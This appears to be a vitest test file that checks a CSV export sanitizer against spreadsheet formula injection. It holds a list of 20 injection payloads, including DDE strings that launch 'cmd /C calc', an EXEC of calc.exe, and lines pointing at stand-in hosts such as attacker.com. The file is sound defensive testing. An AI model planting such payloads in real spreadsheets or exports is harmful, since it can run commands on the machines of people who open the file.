import { describe, expect, it } from 'vitest';
import { sanitizeCsvCell } from '../../src/export/csv';

describe('CSV Spreadsheet Formula-Injection Guard', () => {
  const INJECTION_PAYLOADS: readonly string[] = [
    '=1+1',
    "=cmd|' /C calc'!A0",
    '=HYPERLINK("http://malicious.site","Click")',
    '=SUM(A1:A10)',
    '=DDE("cmd";"/C calc";"__dummy__")',
    '+1+2',
    "+cmd|' /C calc'!A0",
    '+4912345678',
    '+SUM(B1:B5)',
    '-1-2',
    "-cmd|' /C calc'!A0",
    '-5*5',
    '-EXEC("calc.exe")',
    '@SUM(1,2)',
    "@cmd|' /C calc'!A0",
    '@import("http://attacker.com")',
    '@123',
    '\t=1+1',
    '\t@calc',
    '\r=cmd',
  ];

  it('contains exactly 20 distinct formula injection test strings', () => {
    expect(INJECTION_PAYLOADS).toHaveLength(20);
    const unique = new Set(INJECTION_PAYLOADS);
    expect(unique.size).toBe(20);
  });

  it('neutralizes each of the 20 formula injection payloads with a safe prefix', () => {
    for (const payload of INJECTION_PAYLOADS) {
      const sanitized = sanitizeCsvCell(payload);
      // Strips outer enclosing quotes if present to inspect the leading content
      const unquoted = sanitized.replace(/^"|"$/g, '');
      expect(unquoted.startsWith("'")).toBe(true);
    }
  });

  it('safely passes through benign text without prepending a single quote', () => {
    expect(sanitizeCsvCell('Catering & Beverages')).toBe('Catering & Beverages');
    expect(sanitizeCsvCell('Catering, Beverages')).toBe('"Catering, Beverages"');
    expect(sanitizeCsvCell('Photography')).toBe('Photography');
    expect(sanitizeCsvCell(25000)).toBe('25000');
  });
});
